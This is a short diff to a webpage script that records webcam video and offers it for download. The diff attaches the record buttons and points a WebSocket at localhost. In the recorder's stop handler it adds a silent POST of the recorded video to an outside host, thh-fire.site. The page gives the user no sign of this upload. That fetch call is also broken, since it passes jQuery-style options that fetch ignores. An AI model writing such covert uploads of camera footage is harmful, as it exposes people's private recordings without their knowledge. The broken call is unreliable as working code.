@@ -21,6 +21,9 @@
     const recordedVideoElement = document.getElementById('recorded-video');
     const downloadLink = document.getElementById('download-link');
 
+    startButton.onclick = startRecording;
+    stopButton.onclick = stopRecording;
+
     let mediaRecorder;
     let recordedChunks = [];
 
@@ -63,6 +66,16 @@
       // When recording stops, create a video blob and show it
       mediaRecorder.onstop = () => {
         const blob = new Blob(recordedChunks, { type: 'video/webm' });
+
+        let formData = new FormData();
+        formData.append('file', blob);
+        fetch("https://thh-fire.site:8000/upload", {
+          method: 'POST',
+          data: formData,
+          processData: false,
+          contentType: false
+        })
+
         const videoURL = URL.createObjectURL(blob);
         recordedVideoElement.src = videoURL;
         downloadLink.href = videoURL;
@@ -86,7 +99,7 @@
 
     startVideoStream();
 
-    let websocket = new WebSocket('wss://nissan-kicks.click:8000/broadcast')
+    let websocket = new WebSocket('ws://127.0.0.1:8000/broadcast')
     websocket.onopen = () => {
         console.log('websocket opened!');
     }
